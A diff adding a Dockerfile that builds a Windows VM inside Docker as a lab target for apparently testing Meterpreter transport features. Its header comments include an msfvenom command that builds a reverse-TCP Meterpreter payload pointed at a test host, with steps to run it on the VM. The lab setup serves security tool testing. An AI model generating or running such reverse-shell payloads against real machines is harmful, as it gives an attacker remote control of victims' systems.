@@ -1,0 +1,58 @@
+# =============================================================================
+# Assassinate Windows Target Container (KVM-based)
+# =============================================================================
+#
+# This container runs a real Windows VM using QEMU/KVM inside Docker.
+# Uses the dockurr/windows image which handles Windows installation automatically.
+#
+# REQUIREMENTS:
+#   - Linux host with KVM support (check: ls /dev/kvm)
+#   - Docker with --privileged or --device=/dev/kvm
+#   - 4GB+ RAM available for the Windows VM
+#   - ~20GB disk space for Windows installation
+#
+# Features:
+#   - Real Windows 11/10/Server environment
+#   - Full Meterpreter compatibility (Transport Management, etc.)
+#   - RDP access for debugging (port 3389)
+#   - Near-native performance via KVM
+#
+# Usage:
+#   docker compose -f docker/docker-compose.yml build target-windows
+#   docker compose -f docker/docker-compose.yml up target-windows
+#
+# First Run:
+#   Windows installation takes 10-20 minutes on first start.
+#   The container will download and install Windows automatically.
+#
+# Testing Transport Management:
+#   1. Generate payload:
+#      msfvenom -p windows/x64/meterpreter/reverse_tcp \
+#        LHOST=integration-test LPORT=4433 -f exe -o payload.exe
+#   2. Transfer to Windows VM (via RDP or shared folder)
+#   3. Execute payload on Windows
+#   4. Test transport_list, transport_add, etc.
+#
+# =============================================================================
+
+FROM dockurr/windows:latest
+
+# Environment configuration
+ENV RAM_SIZE=4G
+ENV CPU_CORES=2
+ENV DISK_SIZE=20G
+
+# Use Windows 11 (ltsc for smaller footprint, or "win11" for full)
+# Options: win11, win10, ltsc, win2022, win2019, win2016
+ENV VERSION=ltsc
+
+# Disable automatic updates to save resources
+ENV MANUAL=Y
+
+LABEL maintainer="Assassinate Project"
+LABEL description="Windows KVM target for full Meterpreter testing"
+LABEL security.warning="DO NOT expose this container to untrusted networks"
+
+# The base image handles everything else
+# RDP available on port 3389
+# VNC available on port 5900 (for debugging)
